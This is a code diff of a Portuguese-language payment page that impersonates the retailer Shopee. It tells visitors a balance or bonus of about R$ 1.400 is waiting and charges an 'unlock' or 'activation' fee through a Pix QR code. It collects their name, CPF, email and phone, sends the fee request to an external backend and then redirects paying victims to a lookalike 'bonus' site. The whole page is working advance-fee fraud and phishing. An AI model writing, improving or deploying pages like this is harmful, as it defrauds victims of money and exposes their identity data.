@@ -3,411 +3,164 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Finalizar Pagamento</title>
+<title>Resumo Final</title>
+
 <style>
-    /* --- CSS FIEL AO DESIGN --- */
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-    }
-
-    .background {
-        background: linear-gradient(135deg, #ee4d2d, #ff6a4d);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        padding: 20px;
-        width: 100%;
-    }
-
-    .checkout-card {
-        background: #fff;
-        border-radius: 8px;
-        padding: 30px 25px;
-        width: 100%;
-        max-width: 420px;
-        margin: auto;
-        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        position: relative;
-    }
-
-    .logo {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        color: #ee4d2d;
-        font-weight: 700;
-        font-size: 24px;
-        margin-bottom: 25px;
-        letter-spacing: -0.5px;
-    }
-    .bag {
-        width: 36px;
-        height: 36px;
-        background: #ee4d2d;
-        color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        border-radius: 6px;
-        font-size: 20px;
-    }
-
-    h2 {
-        font-size: 18px;
-        color: #333;
-        margin-bottom: 10px;
-        font-weight: 600;
-    }
-
-    .descricao {
-        font-size: 13px;
-        color: #666;
-        margin-bottom: 25px;
-        line-height: 1.5;
-    }
-
-    /* BARRA DE PROGRESSO */
-    .progress-section {
-        margin-bottom: 25px;
-    }
-    .progress-item {
-        display: flex;
-        justify-content: space-between;
-        font-size: 12px;
-        margin-bottom: 6px;
-        text-transform: uppercase;
-        font-weight: 600;
-    }
-    .status.complete { color: #28a745; }
-    .status.pending { color: #ee4d2d; }
-
-    .progress-bar {
-        height: 8px;
-        background: #f0f0f0;
-        border-radius: 10px;
-        overflow: hidden;
-        margin-bottom: 5px;
-    }
-    .progress-fill {
-        height: 100%;
-        width: 50%;
-        background: #ee4d2d;
-        border-radius: 10px;
-        animation: loadingBar 1s ease-in-out;
-    }
-    @keyframes loadingBar {
-        from { width: 0%; }
-        to { width: 50%; }
-    }
-
-    /* CAMPOS DE INPUT */
-    .input-group {
-        margin-bottom: 15px;
-        text-align: left;
-    }
-    .input-group label {
-        font-size: 12px;
-        font-weight: bold;
-        color: #333;
-        display: block;
-        margin-bottom: 5px;
-    }
-    .input-shopee {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #ddd;
-        border-radius: 4px;
-        font-size: 14px;
-        outline: none;
-        transition: border 0.3s;
-    }
-    .input-shopee:focus {
-        border-color: #ee4d2d;
-    }
-
-    /* RESUMO DE VALORES */
-    .resumo {
-        background: #fafafa;
-        border: 1px dashed #ddd;
-        border-radius: 6px;
-        padding: 15px;
-        margin-bottom: 25px;
-        margin-top: 10px;
-    }
-    .resumo-row {
-        display: flex;
-        justify-content: space-between;
-        font-size: 14px;
-        color: #555;
-        margin-bottom: 8px;
-    }
-    .resumo-row strong {
-        color: #333;
-    }
-    .total {
-        color: #ee4d2d;
-        font-size: 18px;
-        font-weight: bold;
-    }
-
-    /* BOTÃO CTA */
-    .cta {
-        width: 100%;
-        background: #ee4d2d;
-        color: white;
-        border: none;
-        padding: 16px;
-        font-size: 16px;
-        font-weight: bold;
-        border-radius: 4px;
-        cursor: pointer;
-        text-transform: uppercase;
-        box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3);
-        transition: all 0.3s;
-    }
-    .cta:hover {
-        background: #d73211;
-        transform: translateY(-2px);
-    }
-    .cta:disabled {
-        background: #ccc;
-        cursor: wait;
-        transform: none;
-        box-shadow: none;
-    }
-
-    .seguranca {
-        margin-top: 20px;
-        text-align: center;
-        font-size: 12px;
-        color: #888;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 5px;
-    }
-
-    #pix_area {
-        display: none;
-        text-align: center;
-        margin-top: 20px;
-        border-top: 1px solid #eee;
-        padding-top: 20px;
-        animation: fadeIn 0.5s;
-    }
-    @keyframes fadeIn {
-        from { opacity: 0; transform: translateY(10px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-    .copy-btn {
-        background: #fff;
-        border: 1px solid #ee4d2d;
-        color: #ee4d2d;
-        padding: 8px 15px;
-        border-radius: 4px;
-        font-weight: bold;
-        cursor: pointer;
-        margin-top: 10px;
-        font-size: 12px;
-    }
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#f7f7f7;padding:20px;display:flex;justify-content:center}
+.container{background:#fff;width:100%;max-width:420px;border-radius:15px;
+box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;border:1px solid #eee}
+.header{padding:20px;display:flex;justify-content:space-between;
+align-items:center;border-bottom:1px solid #f0f0f0}
+.balance-pill{background:#000;color:#fff;padding:5px 12px;
+border-radius:20px;font-size:14px;font-weight:bold}
+.alert-box{background:#fff5f2;border-left:4px solid #ee4d2d;
+margin:15px;padding:15px;border-radius:4px}
+.section-title{font-size:14px;font-weight:bold;color:#444;
+margin:20px 15px 10px;text-transform:uppercase}
+.data-card{background:#f9f9f9;margin:0 15px;padding:15px;
+border-radius:8px;border:1px solid #eee}
+.input-group{margin-bottom:12px}
+.input-group label{font-size:11px;font-weight:bold;color:#888;display:block}
+.input-readonly{width:100%;border:none;background:transparent;
+font-size:15px;color:#333;outline:none}
+.values-card{margin:20px 15px;border-top:1px solid #eee;padding-top:15px}
+.value-row{display:flex;justify-content:space-between;margin-bottom:8px}
+.value-row.total{margin-top:15px;padding-top:10px;
+border-top:1px solid #f0f0f0;color:#ee4d2d;font-weight:bold;font-size:18px}
+.cta-btn{width:calc(100% - 30px);margin:20px 15px;background:#ee4d2d;
+color:#fff;border:none;padding:18px;border-radius:8px;
+font-size:16px;font-weight:bold;cursor:pointer}
+#pix_area{display:none;text-align:center;padding:20px}
+#pix_area img{width:200px;margin-bottom:15px}
+#area_sucesso{display:none;text-align:center;padding:20px}
+.sucesso-btn{background:#1f9c6b;color:#fff;border:none;
+padding:15px 25px;border-radius:8px;font-weight:bold;
+cursor:pointer;margin-top:15px}
 </style>
 </head>
+
 <body>
 
-<div class="background">
-    <div class="checkout-card">
+<div class="container">
 
-        <div class="logo">
-            <div class="bag">S</div>
-            <span>Shopee</span>
-        </div>
+<div class="header">
+<h1>Resumo Final</h1>
+<div class="balance-pill">R$ 1.487,93</div>
+</div>
 
-        <h2 id="titulo_card">Confirmação final do pedido</h2>
+<div class="alert-box">
+<h2>Consolidação de valores</h2>
+<p>Confirme seus dados abaixo para liberar sua bonificação.</p>
+</div>
 
-        <p class="descricao" id="desc_card">
-            Seus dados foram verificados com sucesso. Para concluir a solicitação, confirme seus dados e finalize o pagamento abaixo.
-        </p>
+<div class="section-title">Seus Dados</div>
 
-        <div class="progress-section" id="barra_progresso">
-            <div class="progress-item">
-                <span>Verificação de dados</span>
-                <span class="status complete">Concluído</span>
-            </div>
+<div class="data-card">
+<div class="input-group">
+<label>NOME</label>
+<input type="text" id="nome" class="input-readonly" readonly>
+</div>
+<div class="input-group">
+<label>CPF</label>
+<input type="text" id="cpf" class="input-readonly" readonly>
+</div>
+<div class="input-group">
+<label>E-MAIL</label>
+<input type="text" id="email" class="input-readonly" readonly>
+</div>
+</div>
 
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
+<div class="values-card">
+<div class="value-row">
+<span>Taxa de Ativação</span>
+<strong>R$ 79,10</strong>
+</div>
+<div class="value-row total">
+<span>VALOR TOTAL LIBERADO</span>
+<strong>R$ 1.487,93</strong>
+</div>
+</div>
 
-            <div class="progress-item">
-                <span>Antecipação de saque</span>
-                <span class="status pending">Pendente</span>
-            </div>
-        </div>
+<div id="pix_area">
+<h3 style="color:#1f9c6b;margin-bottom:10px">QR Code Gerado</h3>
+<img id="qr_img">
+<p id="status_pagamento">Aguardando pagamento...</p>
+</div>
 
-        <div id="form_inputs">
-            <div class="input-group">
-                <label>Nome Completo</label>
-                <input type="text" id="nome_cliente" class="input-shopee" placeholder="Digite seu nome">
-            </div>
-            <div class="input-group">
-                <label>E-mail</label>
-                <input type="email" id="email_cliente" class="input-shopee" placeholder="seu@email.com">
-            </div>
-            <div class="input-group">
-                <label>Celular</label>
-                <input type="tel" id="telefone_cliente" class="input-shopee" placeholder="(00) 00000-0000">
-            </div>
-            <div class="input-group">
-                <label>CPF (Apenas números)</label>
-                <input type="tel" id="cpf_cliente" class="input-shopee" placeholder="000.000.000-00" maxlength="14">
-            </div>
-        </div>
+<div id="area_sucesso">
+<h3 style="color:#1f9c6b">Pagamento Confirmado ✅</h3>
+<button class="sucesso-btn" onclick="abrirBonus()">
+ACESSAR SEU BÔNUS
+</button>
+</div>
 
-        <div class="resumo" id="resumo_compra">
-            <div class="resumo-row">
-                <span>&nbsp;</span>
-                <strong>Taxa de Desbloqueio</strong>
-            </div>
-            
-            <div class="resumo-row">
-                <span>Saldo a liberar:</span>
-                <strong>R$ 1.342,03 <span style="color: #1f9c6b;">+ 27,90 + 38,90 = R$ 1.408,83</span></strong>
-            </div>
+<button class="cta-btn" id="btn_pagar" onclick="gerarPixFinal()">
+PROSSEGUIR PARA PAGAMENTO
+</button>
 
-            <div class="resumo-row" style="margin-top:10px; padding-top:10px; border-top:1px solid #eee;">
-                <span>Total a pagar</span>
-                <strong class="total">R$ 38,90</strong>
-            </div>
-        </div>
-
-        <div id="pix_area">
-            <h3 style="color:#28a745; font-size:16px; margin-bottom:10px;">✅ QR Code Gerado!</h3>
-            <p style="font-size:12px; color:#555; margin-bottom:15px;">Escaneie para liberar seu saldo imediatamente.</p>
-            
-            <img id="img_qrcode" src="" style="width: 180px; height: 180px; display: block; margin: 0 auto; border: 1px solid #eee;">
-            
-            <div style="background: #f8f8f8; padding: 10px; border-radius: 4px; margin-top: 15px; word-break: break-all; font-size: 11px; color: #555;" id="txt_copia_cola">
-                ...
-            </div>
-            
-            <button class="copy-btn" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
-        </div>
-
-        <button class="cta" id="btn_finalizar">
-            Finalizar pagamento
-        </button>
-
-        <div class="seguranca">
-            🔒 Ambiente 100% seguro | Shopee Pay
-        </div>
-
-    </div>
 </div>
 
 <script>
-    // --- FUNÇÃO PARA PEGAR PARÂMETROS DA URL OU LOCALSTORAGE ---
-    function capturarDados() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
 
-        // Mapeamento
-        const dados = {
-            nome: urlParams.get('nome') || storedData.nome || "",
-            email: urlParams.get('email') || storedData.email || "",
-            phone: urlParams.get('phone') || urlParams.get('telefone') || storedData.telefone || "",
-            cpf: urlParams.get('cpf') || storedData.cpf || storedData.documento || ""
-        };
+const MODO_TESTE = true;
+const BASE_URL = "https://checkout-pix-profissional.onrender.com";
 
-        if(dados.nome) document.getElementById('nome_cliente').value = dados.nome;
-        if(dados.email) document.getElementById('email_cliente').value = dados.email;
-        if(dados.phone) document.getElementById('telefone_cliente').value = dados.phone;
-        if(dados.cpf) document.getElementById('cpf_cliente').value = dados.cpf;
-    }
+function carregarDados(){
+const urlParams=new URLSearchParams(window.location.search);
+document.getElementById('nome').value=urlParams.get('nome')||"Não informado";
+document.getElementById('cpf').value=urlParams.get('cpf')||"Não informado";
+document.getElementById('email').value=urlParams.get('email')||"Não informado";
+}
+window.onload=carregarDados;
 
-    // Executa ao carregar a página
-    window.onload = capturarDados;
+function gerarPixFinal(){
 
-    const btn = document.getElementById('btn_finalizar');
-    const pixArea = document.getElementById('pix_area');
-    const formInputs = document.getElementById('form_inputs');
-    const resumo = document.getElementById('resumo_compra');
-    const barra = document.getElementById('barra_progresso');
-    
-    // Máscara de CPF simples
-    document.getElementById('cpf_cliente').addEventListener('input', function(e) {
-        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/);
-        e.target.value = !x[2] ? x[1] : x[1] + '.' + x[2] + (x[3] ? '.' + x[3] : '') + (x[4] ? '-' + x[4] : '');
-    });
+const btn=document.getElementById('btn_pagar');
+btn.innerText="GERANDO PIX...";
+btn.disabled=true;
 
-    btn.addEventListener('click', function() {
-        const nome = document.getElementById('nome_cliente').value.trim();
-        const email = document.getElementById('email_cliente').value.trim();
-        const phone = document.getElementById('telefone_cliente').value.trim();
-        const cpf = document.getElementById('cpf_cliente').value.replace(/\D/g, ''); 
-        const valor = "38.90"; 
+const endpointPix=MODO_TESTE?"/pix-teste":"/pix";
+const endpointStatus=MODO_TESTE?"/check-status-teste/":"/check-status/";
 
-        if(nome.length < 3 || cpf.length < 11 || email.length < 5) {
-            alert("Por favor, preencha seus dados corretamente.");
-            return;
-        }
+fetch(BASE_URL+endpointPix,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({valor:"79.10"})
+})
+.then(res=>res.json())
+.then(data=>{
+if(data.success){
 
-        const textoOriginal = btn.innerText;
-        btn.innerText = "PROCESSANDO...";
-        btn.disabled = true;
+document.getElementById('pix_area').style.display="block";
+document.getElementById('qr_img').src=
+data.encodedImage.startsWith('http')
+?data.encodedImage
+:`data:image/png;base64,${data.encodedImage}`;
 
-        // Chamada API enviando todos os dados
-        fetch("https://checkout-pix-profissional.onrender.com/pix", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                name: nome, 
-                cpf: cpf, 
-                email: email, 
-                phone: phone, 
-                valor: valor 
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.success) {
-                formInputs.style.display = 'none';
-                resumo.style.display = 'none';
-                barra.style.display = 'none';
-                btn.style.display = 'none'; 
-                
-                document.getElementById('img_qrcode').src = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
-                document.getElementById('txt_copia_cola').innerText = data.payload;
-                
-                pixArea.style.display = 'block';
-                document.getElementById('titulo_card').innerText = "Pagamento Pendente";
-                document.getElementById('titulo_card').style.color = "#ee4d2d";
-                document.getElementById('desc_card').innerText = "Realize o pagamento para liberar o saldo instantaneamente.";
+btn.style.display="none";
 
-                window.codigoPix = data.payload;
-            } else {
-                alert("Erro ao gerar Pix: " + (data.message || "Tente novamente"));
-                btn.innerText = textoOriginal;
-                btn.disabled = false;
-            }
-        })
-        .catch(err => {
-            console.error(err);
-            alert("Erro de conexão com o servidor.");
-            btn.innerText = textoOriginal;
-            btn.disabled = false;
-        });
-    });
+if(data.transactionId){
+const intervalo=setInterval(()=>{
+fetch(BASE_URL+endpointStatus+data.transactionId)
+.then(r=>r.json())
+.then(st=>{
+if(st.paid){
+clearInterval(intervalo);
+document.getElementById('pix_area').style.display="none";
+document.getElementById('area_sucesso').style.display="block";
+}
+});
+},3000);
+}
+}
+});
+}
 
-    function copiarPix() {
-        if(window.codigoPix) {
-            navigator.clipboard.writeText(window.codigoPix);
-            alert("Código Copiado!");
-        }
-    }
+function abrirBonus(){
+window.location.href="https://recuperabonushopp.com/elementor-1700";
+}
+
 </script>
 
 </body>
